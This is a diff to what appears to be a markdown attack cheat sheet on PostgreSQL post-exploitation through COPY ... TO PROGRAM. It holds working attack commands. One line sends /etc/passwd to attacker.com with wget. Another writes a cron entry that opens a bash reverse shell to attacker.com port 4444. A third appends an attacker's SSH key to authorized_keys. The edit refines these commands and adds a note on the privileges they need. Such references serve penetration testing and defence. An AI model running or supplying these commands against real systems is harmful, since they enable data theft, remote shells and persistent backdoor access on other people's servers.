@@ -153,12 +153,14 @@ COPY (SELECT '') TO PROGRAM 'wget --post-data="$(cat /etc/passwd)" http://attack
 ### Persistence
 
 ```sql
--- Add cron job
-COPY (SELECT '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"') TO '/etc/cron.d/backdoor';
+-- Add cron job (requires privilege escalation - postgres user cannot write to /etc/cron.d)
+COPY (SELECT '') TO PROGRAM 'echo "* * * * * root /bin/bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"" > /tmp/backdoor.cron';
 
--- Add SSH key
-COPY (SELECT 'ssh-rsa AAAA... attacker@host') TO PROGRAM 'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys';
+-- Add SSH key (tee reads SELECT output from stdin)
+COPY (SELECT 'ssh-rsa AAAA... attacker@host') TO PROGRAM 'tee -a ~/.ssh/authorized_keys';
 ```
+
+**Note:** The postgres OS user typically runs with limited privileges. Writing to system directories like `/etc/cron.d/` requires root access. These techniques may require additional privilege escalation or only work in misconfigured environments.
 
 ### Checking Available Methods
 
